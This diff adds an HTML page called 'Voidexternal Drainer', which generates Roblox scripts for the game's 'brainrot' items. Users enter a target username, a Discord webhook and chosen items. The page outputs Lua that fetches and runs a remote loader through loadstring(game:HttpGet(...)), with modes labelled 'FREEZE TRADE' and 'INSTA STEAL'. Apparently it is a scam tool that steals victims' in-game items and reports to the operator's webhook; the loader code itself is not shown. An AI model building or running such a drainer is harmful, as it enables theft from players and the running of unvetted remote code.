@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark"> <title>voidexternal - Drainer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=Space+Grotesk:wght@500;700&display=swap');
+        
+        body { 
+            font-family: 'Inter', sans-seri
+            background-color: #0b0414;
+            color: #f3e8ff; 
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+        .logo-font { font-family: 'Space Grotesk', sans-serif; }
+        
+        .card { background: linear-gradient(145deg, #170a29, #230d42); border: 1px solid #4a2085; }
+        .input-field { background-color: #1a0b2e; border: 1px solid #4a2085; color: #e9d5ff; transition: all 0.2s; }
+        .input-field:focus { border-color: #a855f7; box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.2); outline: none; }
+        
+        .shimmer-text { 
+            background: linear-gradient(90deg, #d8b4fe, #ffffff, #d8b4fe);
+            background-size: 200% auto; 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 4s linear infinite; 
+        }
+        @keyframes shimmer { to { background-position: 200% center; } }
+
+        .output-container { background-color: #0e0517; border: 1px solid #3d1a6e; border-radius: 1.25rem; }
+        .code-area { 
+            background-color: #09030f; 
+            color: #d8b4fe; 
+            font-family: 'JetBrains Mono', 'Consolas', monospace; 
+            scrollbar-width: thin; 
+            scrollbar-color: #a855f7 transparent;
+            max-height: 120px; 
+        }
+
+        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #2e1a47; transition: .4s; border-radius: 34px; border: 1px solid #4a2085; }
+        input:checked + .slider { background-color: #9333ea; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider:before { transform: translateX(20px); }
+
+        .brainrot-pill { transition: all 0.2s; user-select: none; }
+        #brainrot-container::-webkit-scrollbar { width: 4px; }
+        #brainrot-container::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 10px; }
+        .hidden { display: none !important; }
+
+        #gen-btn {
+            box-shadow: 0 0 20px rgba(147, 51, 234, 0.3);
+        }
+        #gen-btn:hover {
+            box-shadow: 0 0 30px rgba(147, 51, 234, 0.6);
+            transform: scale(1.02);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-6">
+
+    <div id="main-tool" class="max-w-xl w-full">
+        
+        <div class="flex flex-col sm:flex-row items-center justify-between mb-8 gap-4">
+            <div class="flex-1 min-w-0 pr-4">
+                <h1 class="text-3xl sm:text-4xl font-black tracking-tighter logo-font shimmer-text uppercase italic leading-tight py-2">
+                    Voidexternal Drainer
+                </h1>
+            </div>
+            
+            <div id="auth-section" class="flex-shrink-0">
+                <a href="/api/auth" id="top-login-btn" class="bg-[#5865F2] hover:bg-[#4752c4] text-white text-[10px] sm:text-xs font-black px-5 py-3 rounded-xl transition-all shadow-lg flex items-center gap-2 uppercase tracking-widest whitespace-nowrap">
+                    <i class="fa-brands fa-discord text-base"></i> Authorize
+                </a>
+                
+                <div id="logged-in-status" class="hidden text-purple-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-2 border border-purple-500/30 bg-purple-500/10 px-4 py-2 rounded-xl">
+                    <i class="fa-solid fa-circle-check text-green-400"></i> Authenticated
+                </div>
+            </div>
+        </div>
+
+        <div class="card rounded-3xl p-7 shadow-2xl mb-6 shadow-purple-900/20">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                <div>
+                    <label class="text-[10px] font-bold text-purple-400 tracking-widest block mb-2 uppercase">Your Username</label>
+                    <input id="roblox-username" type="text" placeholder="YOUR USERNAME" class="input-field w-full px-4 py-3 rounded-xl text-md focus:outline-none">
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-purple-400 tracking-widest block mb-2 uppercase">Audio ID (Optional)</label>
+                    <input id="audio-id" type="text" placeholder="123456..." class="input-field w-full px-4 py-3 rounded-xl text-sm font-mono focus:outline-none">
+                </div>
+            </div>
+
+            <div class="mb-5">
+                <label class="text-[10px] font-bold text-purple-400 tracking-widest block mb-2 uppercase">Discord Webhook (Optional)</label>
+                <input id="webhook" type="text" placeholder="https://..." class="input-field w-full px-4 py-3 rounded-xl text-xs font-mono focus:outline-none">
+            </div>
+
+            <div class="mb-5">
+                <label class="text-[10px] font-bold text-purple-400 tracking-widest block mb-2 uppercase">Execution Mode</label>
+                <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                    <button onclick="setMode('normal')" id="btn-normal" class="py-3 rounded-xl border border-purple-400 bg-purple-600/30 text-purple-200 text-[9px] font-black tracking-widest transition-all">NO GUI</button>
+                    <button onclick="setMode('freeze')" id="btn-freeze" class="py-3 rounded-xl border border-purple-900/50 bg-purple-950/30 text-purple-600 text-[9px] font-black tracking-widest transition-all">FREEZE TRADE</button>
+                    <button onclick="setMode('duels')" id="btn-duels" class="py-3 rounded-xl border border-purple-900/50 bg-purple-950/30 text-purple-600 text-[9px] font-black tracking-widest transition-all">DUELS SCRIPT</button>
+                    <button onclick="setMode('insta')" id="btn-insta" class="py-3 rounded-xl border border-purple-900/50 bg-purple-950/30 text-purple-600 text-[9px] font-black tracking-widest transition-all">INSTA STEAL</button>
+                </div>
+            </div>
+
+            <div class="mb-6">
+                <div class="flex items-center justify-between mb-3">
+                    <label class="text-[10px] font-bold text-purple-400 tracking-widest uppercase">Target Brainrots</label>
+                    <div class="flex gap-2">
+                        <button onclick="selectAll()" class="text-[9px] font-black text-purple-300 hover:text-white uppercase tracking-tighter bg-purple-800/40 px-2 py-1 rounded border border-purple-700/50">Select All</button>
+                        <button onclick="deselectAll()" class="text-[9px] font-black text-purple-500 hover:text-purple-300 uppercase tracking-tighter bg-purple-950/60 px-2 py-1 rounded border border-purple-900/50">Deselect All</button>
+                    </div>
+                </div>
+                
+                <div class="mb-4">
+                    <input id="brainrot-search" type="text" placeholder="🔎 Search brainrots..." class="input-field w-full px-4 py-2.5 rounded-xl text-sm focus:outline-none placeholder:text-purple-400/50">
+                </div>
+
+                <div class="flex items-center justify-between mb-3">
+                    <span id="count-text" class="text-[10px] text-purple-400 font-bold tracking-widest uppercase">0 SELECTED</span>
+                </div>
+
+                <div id="brainrot-container" class="flex flex-wrap gap-2 max-h-40 overflow-y-auto pr-2 py-1"></div>
+            </div>
+
+            <div class="flex items-center justify-between mb-6 p-4 bg-purple-950/20 rounded-2xl border border-purple-800/30">
+                <div>
+                    <p class="text-[11px] font-bold text-purple-200 uppercase tracking-wider">Output as Short Loadstring</p>
+                    <p class="text-[9px] text-purple-500 uppercase">Save to database & get tiny URL</p>
+                </div>
+                <label class="switch">
+                    <input type="checkbox" id="loadstring-toggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+
+            <p id="login-error-msg" class="hidden text-[#ff4a4a] text-center text-[11px] font-bold tracking-widest uppercase mb-3">
+                <i class="fa-solid fa-triangle-exclamation"></i> Login please to generate script. Click the button above.
+            </p>
+
+            <button onclick="generateScript()" id="gen-btn" class="w-full bg-gradient-to-r from-purple-600 via-fuchsia-600 to-purple-600 bg-[length:200%_auto] hover:bg-right transition-all duration-500 py-5 rounded-2xl text-lg font-black tracking-[0.25em] flex items-center justify-center gap-x-3 text-white">
+                <i class="fa-solid fa-bolt text-xl" id="gen-icon"></i>
+                <span id="gen-text">GENERATE SCRIPT</span>
+            </button>
+        </div>
+
+        <div id="output-section" class="hidden output-container p-5 animate-in fade-in slide-in-from-bottom-4 duration-700">
+            <div class="flex items-center justify-between mb-3">
+                <span class="text-[10px] font-black text-purple-400 tracking-widest uppercase">Generated Result</span>
+                <button onclick="copyToClipboard()" id="copy-btn" class="bg-purple-900/40 text-purple-200 text-[10px] font-black px-4 py-2 rounded-lg border border-purple-600/30 hover:bg-purple-800 transition-colors">COPY</button>
+            </div>
+            <pre id="script-display" class="code-area p-4 rounded-xl text-[12px] leading-relaxed overflow-x-auto whitespace-pre"></pre>
+        </div>
+    </div>
+
+    <script>
+        const EIGHT_HOURS = 8 * 60 * 60 * 1000;
+        const urlParams = new URLSearchParams(window.location.search);
+        let isAuthenticated = false;
+        
+        const brainrots = ["Garama and Madundung", "Capitano Moby", "Burguro And Fryuro", "Ketchuru and Musturu", "Lavadorito Spinito", "Ketupat Kepat", "Tictac Sahur", "Tang Tang Keletang", "Money Money Puggy", "Nuclearo Dinossauro", "Graipuss Medussi", "Cerberus", "Dragon Cannelloni", "Agarrini la Palini", "Fragola La La La", "Los Hotspotsitos", "Los Bros", "Tralaledon", "Los Puggies", "Los Primos", "Los Tacoritas", "Los Spaghettis", "Spooky and Pumpky", "Fragrama and Chocrama", "La Casa Boo", "Ketupat Bros", "Cooki and Milki", "Popcuru and Fizzuru", "La Supreme Combinasion", "Dragon Gingerini", "Headless Horseman", "Hydra Dragon Cannelloni", "Celularcini Viciosini", "La Grande Combinasion", "Los Trios", "La Sahur Combinasion", "Bacuru and Egguru", "Eviledon", "Orcaledon", "Money Money Reindeer", "Los Jolly Combinasionas", "Jolly Jolly Sahur", "Chicleteira Noelteira", "Bisonte Giuppitere", "Jackorilla", "Reindeer Tralala", "Pumpkini Spyderini", "Frankentteo", "Santteo", "Telemorte", "Spaghetti Tualetti", "La Secret Combinasion", "La Food Combinasion", "Los Spooky Combinasionas", "Karkerkar Kurkur", "La Ginger Sekolah", "Rosey and Teddy", "Los Sekolahs", "Reinito Sleighito", "Swaggy Bros", "La Taco Combinasion", "Chipso and Queso", "La Spooky Grande", "Tuff Toucan", "Chillin Chili", "Gobblino Uniciclino", "Strawberry Elephant", "La Extinct Grande", "Tacorita Bicicleta", "Quesadillo Vampiro", "Perrito Burrito", "La Vacca Saturno Saturnita", "Karker Sahur", "Bunito Bunito Spinito", "Pirulitoita Bicicleteira", "Bunnyman", "Brunito Marsito", "Guest 666", "Mariachi Corazoni", "Swag Soda", "Extinct Matteo", "Los Quesadillas", "Spinny Hammy", "Meowl", "Skibidi Toilet", "Nacho Spyder", "Griffin", "W or L", "La Jolly Grande", "La Romantic Grande", "Festive 67", "Los Tralaleritos", "Las Tralaleritas", "GOAT", "Love Love Bear", "Ginger Gerat", "Mieteteira Bicicleteira", "Trenostruzzo Turbo 4000", "La Karkerkar Combinasion", "La Vacca Prese Presente", "Rocco Disco", "Cuadramat and Pakrahmatmamat", "25", "Cupid Cupid Sahur", "Ho Ho Ho Sahur", "Chill Puppy", "Los Sweethearts", "Las Sis", "Los Planitos", "Los Candies", "Los Mobilis", "Zombie Tralala", "Boatito Auratito", "Vulturino Skeletono", "La Cucaracha", "Extinct Tralalero", "La Vacca Jacko Linterino", "Triplito Tralaleritos", "Trickolino", "Giftini Spyderini", "Love Love Love Sahur", "Please my Present", "Santa Hotspot", "Naughty Naughty", "Cupid Hotspot", "Noo my Candy", "Noo my Present", "Ventoliero Pavonero", "Los Cupids", "Celestial Pegasus", "Antonio", "La Lucky Grande", "Granny", "Cloverat Clapat", "Dug dug dug", "Fortunu and Cashuru", "Gold Gold Gold", "Snailo Clovero", "Noo my Gold", "Luck Luck Luck Sahur", "La Vacca Lepre Lepreino", "Clovkur Kurkur", "Patteo", "Foxini Lanternini", "Eid Eid Eid Sahur", "To to to Sahur", "Chicleteirina Bicicleteirina", "Chicliterita bicicliterita", "Chicleteira Bicicleteira", "Job Job Job Sahur", "Lovin Rose", "List List List Sahur", "Los Combinasionas", "Los Amigos", "Sammyni Fattini", "Rosetti Tualetti", "Los 67", "Esok Sekolah", "Pot Hotspot", "Guerriro Digitale", "Los Tortus", "Torrtuginni Dragonfrutini", "Los Mi Gatitos", "Los Chicleteiras", "Yess my examine", "Noo my examine", "1x1x1x1", "Los Karkeritos", "Las Vaquitas Saturnitas", "Los Spyderinis", "Los Matteos", "Los Cucarachas", "67", "Los Burritos", "Rang Ring Bus", "Arcadopus", "Los Nooo My Hotspotsitos", "Burrito Bandito", "Mi Gatito", "Pot Pumpkin", "Quesadilla Crocodila", "Horegini Boom", "Nooo My Hotspot", "Tung Tung Tung Sahur", "Los Jobcitos", "Coffin Tung Tung Tung Sahur", "Blackhole Goat", "Chachechi", "Dul Dul Dul", "Sammyni Spyderini", "Chicleteira Cupideira", "Fishino Clownino", "Chimnino", "Noo my Heart", "Los 25", "Donkeyturbo Express", "Elefanto Frigo", "Noo my Eggs"];
+        let selected = new Set();
+        let currentMode = 'normal';
+
+        function checkSession() {
+            const loginTime = localStorage.getItem('auth_timestamp');
+            const now = Date.now();
+            
+            if (urlParams.get('login') === 'success') {
+                localStorage.setItem('auth_timestamp', now);
+                window.history.replaceState({}, document.title, "/");
+                setLoggedIn();
+                return;
+            }
+            if (loginTime && (now - loginTime < EIGHT_HOURS)) {
+                setLoggedIn();
+            } else {
+                setLoggedOut();
+            }
+        }
+
+        function setLoggedIn() {
+            isAuthenticated = true;
+            document.getElementById('top-login-btn').classList.add('hidden');
+            document.getElementById('logged-in-status').classList.remove('hidden');
+            createPills();
+        }
+
+        function setLoggedOut() {
+            isAuthenticated = false;
+            localStorage.removeItem('auth_timestamp');
+            document.getElementById('top-login-btn').classList.remove('hidden');
+            document.getElementById('logged-in-status').classList.add('hidden');
+            createPills();
+        }
+
+        function setMode(mode) {
+            currentMode = mode;
+            const modes = ['normal', 'freeze', 'duels', 'insta'];
+            modes.forEach(m => {
+                const btn = document.getElementById(`btn-${m}`);
+                if (m === mode) {
+                    btn.className = 'py-3 rounded-xl border border-purple-400 bg-purple-600/30 text-purple-200 text-[9px] font-black tracking-widest transition-all';
+                } else {
+                    btn.className = 'py-3 rounded-xl border border-purple-900/50 bg-purple-950/30 text-purple-600 text-[9px] font-black tracking-widest transition-all';
+                }
+            });
+        }
+
+        function createPills(filtered = brainrots) {
+            const container = document.getElementById('brainrot-container');
+            container.innerHTML = "";
+            filtered.forEach(name => {
+                const pill = document.createElement('div');
+                pill.className = `brainrot-pill bg-purple-900/20 text-purple-400 text-[10px] font-bold px-3 py-1.5 rounded-lg cursor-pointer border border-purple-800/40`;
+                pill.textContent = name;
+                if (selected.has(name)) pill.classList.add('bg-purple-600', 'text-white', 'border-purple-400');
+                pill.onclick = () => { 
+                    if (selected.has(name)) selected.delete(name); 
+                    else selected.add(name); 
+                    updateCount(); 
+                    createPills(filtered); 
+                };
+                container.appendChild(pill);
+            });
+        }
+
+        function filterBrainrots() {
+            const term = document.getElementById('brainrot-search').value.toLowerCase().trim();
+            const filtered = term ? brainrots.filter(n => n.toLowerCase().includes(term)) : brainrots;
+            createPills(filtered);
+        }
+
+        function selectAll() { brainrots.forEach(n => selected.add(n)); createPills(); updateCount(); }
+        function deselectAll() { selected.clear(); createPills(); updateCount(); }
+        function updateCount() { document.getElementById('count-text').textContent = `${selected.size} SELECTED`; }
+
+        async function generateScript() {
+            const errorMsg = document.getElementById('login-error-msg');
+            
+            if (!isAuthenticated) {
+                errorMsg.classList.remove('hidden');
+                setTimeout(() => { errorMsg.classList.add('hidden'); }, 4000);
+                return;
+            }
+
+            const btnText = document.getElementById('gen-text');
+            const btnIcon = document.getElementById('gen-icon');
+            const display = document.getElementById('script-display');
+            const output = document.getElementById('output-section');
+
+            const user = document.getElementById('roblox-username').value.trim() || "YOUR USERNAME";
+            const web = document.getElementById('webhook').value.trim() || "NO WEBHOOK";
+            
+            let audioInput = document.getElementById('audio-id').value.trim();
+            let audioId = "no audio id";
+            if (audioInput !== "") {
+                if (!isNaN(audioInput)) {
+                    audioId = "rbxassetid://" + audioInput;
+                } else {
+                    audioId = audioInput;
+                }
+            }
+
+            const useShortLink = document.getElementById('loadstring-toggle').checked;
+            
+            let loader = "c5a067c93477b930cc4602547c6d5ffe";
+            if (currentMode === 'freeze') {
+                loader = "ecd65ca2d9a4cf35c9951aada0f53aa2";
+            } else if (currentMode === 'duels') {
+                loader = "82744afa27eb7289197ee5032a94ca10";
+            } else if (currentMode === 'insta') {
+                loader = "69ebd47abc10f91ef0a43a3f26746221";
+            }
+
+            const selectedArray = Array.from(selected);
+            const bTable = selectedArray.map((b, i) => ` ["${b}"] = true${i < selectedArray.length-1 ? ',' : ''}`).join("\n");
+
+            const fullScript = `getgenv().TARGET_USER = "${user}"
+getgenv().WEBHOOK_URL = "${web}"
+getgenv().DRAIN_AUDIO_ID = "${audioId}"
+getgenv().NORMAL_BRAINROTS = {
+${bTable}
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/${loader}.lua"))()`;
+
+            output.classList.remove('hidden');
+            if (useShortLink) {
+                btnText.textContent = "GENERATING...";
+                btnIcon.className = "fa-solid fa-spinner animate-spin";
+                display.textContent = "-- Saving to database...";
+                try {
+                    const response = await fetch('/api/save', { 
+                        method: 'POST', 
+                        headers: {'Content-Type': 'application/json'}, 
+                        body: JSON.stringify({ script: fullScript }) 
+                    });
+                    if (response.ok) {
+                        const data = await response.json();
+                        display.textContent = data.loadstring;
+                    } else display.textContent = "-- ERROR: Check Vercel Functions";
+                } catch(e) { display.textContent = "-- ERROR: Request failed"; }
+                btnText.textContent = "GENERATE SCRIPT";
+                btnIcon.className = "fa-solid fa-bolt";
+            } else {
+                display.textContent = fullScript;
+            }
+        }
+
+        function copyToClipboard() {
+            navigator.clipboard.writeText(document.getElementById('script-display').textContent);
+            const btn = document.getElementById('copy-btn');
+            btn.textContent = 'COPIED!'; setTimeout(() => btn.textContent = 'COPY', 2000);
+        }
+
+        window.onload = function() {
+            checkSession();
+            document.getElementById('brainrot-search').addEventListener('input', filterBrainrots);
+        };
+    </script>
+</body>
+</html>
